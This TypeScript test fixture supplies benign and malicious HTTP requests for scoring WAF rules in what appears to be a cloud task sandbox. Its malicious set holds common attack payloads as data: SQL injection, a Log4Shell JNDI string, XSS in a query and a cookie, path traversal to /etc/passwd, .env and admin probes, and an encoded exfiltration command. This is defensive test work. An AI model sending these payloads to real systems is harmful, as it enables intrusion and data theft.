// The two request sets the rule sandbox scores against.

import { appTrafficPaths } from "../config/paths.ts";
import type { TestRequest } from "../../src/lib/types.ts";

const BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

/**
 * The benign set: the requests the task sheet documents for each served path
 * (GET with the grader's requestid/uuid query, POST with the JSON body shape
 * the binaries bind), the load generator, and the ALB health check. A rule that
 * blocks any of these is a false positive, which is what the sandbox is for.
 */
export function defaultTestRequests(): TestRequest[] {
  const paths = appTrafficPaths();
  const rid = "requestid=999999999999&uuid=7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729";
  const getHeaders = { host: "app.example.com", accept: "application/json" };
  const jsonHeaders = { host: "app.example.com", "content-type": "application/json" };
  const benign = (
    id: string,
    method: string,
    path: string,
    query: string,
    headers: Record<string, string>,
    body: string,
  ): TestRequest => ({
    id,
    method,
    path,
    query,
    userAgent: BROWSER_UA,
    ip: "10.0.2.88",
    country: "KR",
    benign: true,
    headers,
    body,
    labels: [],
  });

  const rows: TestRequest[] = [];
  for (const [i, p] of paths.entries()) {
    const id = "app-" + i;
    switch (p) {
      case "/v1/user":
        rows.push(
          benign(
            id + "-get",
            "GET",
            p,
            "email=dbdump500001%40example.org&" + rid,
            getHeaders,
            "",
          ),
          benign(
            id + "-post",
            "POST",
            p,
            "",
            jsonHeaders,
            `{"requestid":"999999999999","uuid":"7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729","username":"dbdump500001","email":"dbdump500001@example.org","status_message":"I'm happy"}`,
          ),
        );
        break;
      case "/v1/product":
        rows.push(
          benign(id + "-get", "GET", p, "id=dbdump50001&" + rid, getHeaders, ""),
          benign(
            id + "-post",
            "POST",
            p,
            "",
            jsonHeaders,
            `{"requestid":"999999999999","uuid":"7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729","id":"dbdump500001","name":"dbdump500001","price":1234}`,
          ),
        );
        break;
      case "/v1/stress":
        // stress registers POST only — a GET here is a gin 404, not traffic.
        rows.push(
          benign(
            id + "-post",
            "POST",
            p,
            "",
            jsonHeaders,
            `{"requestid":"999999999999","uuid":"7c5a3c6a-758f-4bc5-9bdf-3e573a0ad729","length":256}`,
          ),
        );
        break;
      default:
        rows.push(benign(id, "GET", p, "", getHeaders, ""));
    }
  }

  rows.push(
    {
      id: "loadgen",
      method: "GET",
      path: paths[0] ?? "/v1/user",
      query: "email=dbdump500002%40example.org&" + rid,
      userAgent: "Go-http-client/2.0",
      ip: "10.0.2.23",
      country: "KR",
      benign: true,
      headers: { host: "app.example.com" },
      body: "",
      labels: [],
    },
    {
      id: "healthcheck",
      method: "GET",
      path: "/healthcheck",
      query: "",
      userAgent: "ELB-HealthChecker/2.0",
      ip: "10.0.2.1",
      country: "KR",
      benign: true,
      headers: { host: "app.example.com" },
      body: "",
      labels: [],
    },
  );
  return rows;
}

interface MalOptions {
  query?: string;
  body?: string;
  headers?: Record<string, string>;
}

function mal(
  id: string,
  method: string,
  path: string,
  userAgent: string,
  ip: string,
  country: string,
  opts: MalOptions = {},
): TestRequest {
  return {
    id,
    method,
    path,
    query: opts.query ?? "",
    userAgent,
    ip,
    country,
    benign: false,
    headers: { host: "app.example.com", ...opts.headers },
    body: opts.body ?? "",
    labels: [],
  };
}

/**
 * The deliberately malicious set. Blocking any of these is the point of a WAF
 * rule — the sandbox scores them as caught, not as a false positive. The set
 * exercises every field the evaluator models (path, query, header, cookie,
 * user-agent, body).
 */
export function maliciousExampleRequests(): TestRequest[] {
  return [
    mal("mal-wplogin", "GET", "/wp-login.php", "Mozilla/5.0", "203.0.113.7", "CN"),
    mal("mal-sqlmap", "GET", "/v1/user", "sqlmap/1.7", "203.0.113.8", "RU", {
      query: "id=1%20OR%201=1",
    }),
    mal("mal-env", "GET", "/.env", "python-requests/2.31", "203.0.113.9", "CN"),
    mal("mal-jndi", "GET", "/v1/user", "${jndi:ldap://x/a}", "203.0.113.10", "US"),
    mal("mal-b64", "GET", "/v1/product", "Mozilla/5.0", "203.0.113.11", "CN", {
      query: "cmd=Z2V0fHBvc3RfZGF0YV9leGZpbA==",
    }),
    mal("mal-gobuster", "GET", "/admin", "gobuster/3.6", "203.0.113.12", "RU"),
    mal("mal-xss", "GET", "/v1/product", BROWSER_UA, "203.0.113.13", "US", {
      query: "q=%3Cscript%3Ealert(1)%3C/script%3E",
    }),
    mal("mal-traversal", "GET", "/v1/user/../../etc/passwd", "curl/8.4.0", "203.0.113.14", "CN"),
    mal("mal-sqli-body", "POST", "/v1/user", BROWSER_UA, "203.0.113.15", "RU", {
      body: `{"requestid":"1","uuid":"x","username":"a' UNION SELECT password FROM users--","email":"a@b.org","status_message":"x"}`,
      headers: { "content-type": "application/json" },
    }),
    // The product binary's own trap: this User-Agent makes it answer 500
    // ("Consumed resources by malicious attacks") — the task's abnormal
    // request, which the WAF has to turn into a 403 first.
    mal("mal-attacker-bot", "POST", "/v1/product", "Attacker-Bot", "203.0.113.17", "KR", {
      body: `{"requestid":"1","uuid":"x","id":"dbdump500001","name":"dbdump500001","price":1234}`,
      headers: { "content-type": "application/json" },
    }),
    // Email Request Validation: the task wants POST /v1/user with an email that
    // is not xxxx@xxxx.xxxx answered 403, and says the app does not check it —
    // so the WAF must.
    mal("mal-email-nodomain", "POST", "/v1/user", BROWSER_UA, "203.0.113.18", "KR", {
      body: `{"requestid":"1","uuid":"x","username":"gildong","email":"gildong","status_message":"x"}`,
      headers: { "content-type": "application/json" },
    }),
    mal("mal-email-notld", "POST", "/v1/user", BROWSER_UA, "203.0.113.19", "KR", {
      body: `{"requestid":"1","uuid":"x","username":"gildong","email":"gildong@example","status_message":"x"}`,
      headers: { "content-type": "application/json" },
    }),
    mal("mal-cookie", "GET", "/v1/user", BROWSER_UA, "203.0.113.16", "CN", {
      headers: { cookie: "session=abc; tracker=<script>x</script>" },
    }),
  ];
}
